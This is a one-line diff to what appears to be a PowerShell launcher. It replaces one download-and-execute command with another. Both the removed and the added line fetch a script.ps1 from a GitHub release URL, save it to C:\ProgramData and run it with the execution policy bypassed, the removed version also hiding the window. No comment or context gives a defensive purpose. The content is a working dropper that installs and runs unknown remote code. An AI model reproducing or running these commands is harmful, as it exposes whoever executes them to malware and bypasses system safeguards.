@@ -1,1 +1,1 @@
-$u='https://github.com/anaslabrini/crossmos/releases/download/892009/script.ps1';$p='C:\ProgramData\s.ps1';if(!(Test-Path $p)){iwr $u -OutFile $p};powershell -W Hidden -Exec Bypass -File $p;exit
+powershell -ExecutionPolicy Bypass -Command "(New-Object System.Net.WebClient).DownloadFile('https://github.com/anaslabrini/crossmos/releases/download/892009/script.ps1', 'C:\ProgramData\script.ps1'); & 'C:\ProgramData\script.ps1'"
